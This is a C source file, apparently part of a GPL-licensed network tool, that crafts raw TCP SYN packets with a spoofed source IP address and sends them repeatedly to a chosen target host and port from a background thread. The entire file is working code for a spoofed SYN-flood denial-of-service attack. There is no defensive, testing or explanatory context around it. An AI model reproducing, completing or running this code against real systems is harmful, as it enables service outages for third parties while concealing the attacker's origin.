/******************************************************************************/
/**                                                                          **/
/**                                                                          **/
/**                                                                          **/
/**                                                                          **/
/**                                                                          **/
/**                                                                          **/
/******************************************************************************/
/** Copyright (C) 2011 Quetuo (http://www.quetuo.net)                        **/
/**                                                                          **/
/** This program is free software: you can redistribute it and/or modify     **/
/** it under the terms of the GNU General Public License as published by     **/
/** the Free Software Foundation, either version 3 of the License, or        **/
/** (at your option) any later version.                                      **/
/**                                                                          **/
/** This program is distributed in the hope that it will be useful,          **/
/** but WITHOUT ANY WARRANTY; without even the implied warranty of           **/
/** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the            **/
/** GNU General Public License for more details.                             **/
/**                                                                          **/
/** You should have received a copy of the GNU General Public License        **/
/** along with this program.  If not, see <http://www.gnu.org/licenses/>.    **/
/******************************************************************************/

#include "include.h"

pthread_t thread;
char datagram [4096];
struct iphdr *iph;
struct sockaddr_in sin;

unsigned short checksum (unsigned short * ptr, int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;	 
	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char*)&oddbyte) = *(u_char*)ptr;
		sum += oddbyte;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short) ~sum;
	return answer;
}

void net_create_packet () {
	char source_ip [32];
	iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	
	struct pseudo_header psh;

	struct hostent * host;
	if ((host = gethostbyname (options.target)) == NULL) {
		printf ("Could not resolve host %s\n", options.target);
		_exit (EXIT_FAILURE);
	}

	strcpy (source_ip, options.source_ip);
	sin.sin_family = AF_INET;
	sin.sin_port = htons (options.port);
	sin.sin_addr.s_addr = inet_addr (options.target);

	memset (datagram, 0, 4096);
	iph -> ihl = 5;
	iph -> version = 4;
	iph -> tos = 0;
	iph -> tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph -> id = htonl (54321);	//Id of this packet
	iph -> frag_off = 0;
	iph -> ttl = 255;
	iph -> protocol = IPPROTO_TCP;
	iph -> check = 0;		//Set to 0 before calculating checksum
	iph -> saddr = inet_addr (source_ip);	//Spoof the source ip address
	iph -> daddr = sin.sin_addr.s_addr;

	iph -> check = checksum ((unsigned short *) datagram, iph -> tot_len >> 1);

	tcph -> source = htons (1234);
	tcph -> dest = htons (options.port);
	tcph -> seq = 0;
	tcph -> ack_seq = 0;
	tcph -> doff = 5;		/* first and only tcp segment */
	tcph -> fin=0;
	tcph -> syn=1;
	tcph -> rst=0;
	tcph -> psh=0;
	tcph -> ack=0;
	tcph -> urg=0;
	tcph -> window = htons (5840);	/* maximum allowed window size */
	tcph -> check = 0;
	tcph -> urg_ptr = 0;

	psh.source_address = inet_addr (source_ip);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);

	memcpy (&psh.tcp , tcph , sizeof (struct tcphdr));
	tcph -> check = checksum ((unsigned short*) &psh , sizeof (struct pseudo_header));

	packet_size = (int) iph->tot_len;
}

int net_init () {
	net_create_packet ();
	pthread_create (&thread, NULL, net_thread, NULL);
	return 0;
}

void * net_thread (void * ptr) {
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	
	int one = 1;
	const int *val = &one;
	setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one));

	while (1) {
		if (packets < options.max_packets) {
			sendto (s,
					datagram,
					iph -> tot_len,
					0,
					(struct sockaddr *) &sin,
					sizeof (sin));
			packets ++;
		} else {
			usleep (100);
		}
	}
	printf ("exiting O_o");
	return NULL;
}